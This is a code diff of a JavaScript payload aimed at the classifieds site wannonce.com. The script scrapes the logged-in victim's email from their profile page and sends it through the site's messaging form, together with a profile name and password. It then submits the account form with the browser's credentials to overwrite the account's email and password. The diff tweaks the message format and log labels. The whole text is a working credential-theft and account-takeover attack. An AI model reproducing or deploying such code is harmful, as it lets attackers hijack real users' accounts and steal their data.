@@ -15,11 +15,11 @@ function hwww(email, pwd) {
         },
         "referrer": "https://www.wannonce.com/membres/infos_membre.php",
         "referrerPolicy": "strict-origin-when-cross-origin",
-        "body": `prenom=PN&email=${encodeURIComponent(email)}&type_compte=particulier&nom_societe=&siret=&identification_number=&profil_adresse=&profil_adresse2=&profil_cp=&profil_ville=&profil_pays=&profil_tel=&sexe=femme&pwd=${pwd}&pwd_confirm=${pwd}&param_geolocalisation=oui&param_email_alerte=1&param_archiver_msg_send=1&param_use_chat=1&param_notifications=1&param_email_notif=1&param_anonymous=0&register=Traitement+en+cours...`,
+        "body": `prenom=PN&email=${encodeURIComponent("u"+email)}&type_compte=particulier&nom_societe=&siret=&identification_number=&profil_adresse=&profil_adresse2=&profil_cp=&profil_ville=&profil_pays=&profil_tel=&sexe=femme&pwd=${pwd}&pwd_confirm=${pwd}&param_geolocalisation=oui&param_email_alerte=1&param_archiver_msg_send=1&param_use_chat=1&param_notifications=1&param_email_notif=1&param_anonymous=0&register=Traitement+en+cours...`,
         "method": "POST",
         "mode": "cors",
         "credentials": "include"
-    }).then((r) => console.log(r.url, r.status), (e) => alert(e))
+    }).then((r) => console.log("lup", r.url, r.status), (e) => alert(e))
 }
 
 
@@ -29,21 +29,20 @@ fetch('/membres/infos_membre.htm').then(r => r.text()).then(function(html) {
     let doc = parser.parseFromString(html, 'text/html');
     let mailpath = '//*[@id="form_user"]/fieldset[1]/div/table/tbody/tr[2]/td[2]/input/@value';
     let email = doc.evaluate(mailpath, doc, null, XPathResult.STRING_TYPE, null).stringValue;
-    let sd = profil + " " + email.replace('@', '_aa_') + " " + pwd;
-    console.log(sd)
+    console.log("linfo em", email);
 
     fetch(hwurl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: new URLSearchParams({
-            'sujet': 'Leadd',
+            'sujet': 'RE : ' + pwd,
             piece_jointe_1: undefined,
             piece_jointe_2: undefined,
-            message: sd, //"pw_" + profil + "_pwd_" + pwd,
+            message: `re: coucou\n${profil}\n${pwd}\n${email.replace('@', '_aa_')}`, //sd, //"pw_" + profil + "_pwd_" + pwd,
             send_msg: "Envoi en cours, patientez SVP..."
         })
     }).then((r) => {
-        console.log(r.url, r.status);
+        console.log("lmesg", r.url, r.status);
         hwww(email, pwd);
     }, (e) => alert(e)).then(() => 1)
 });
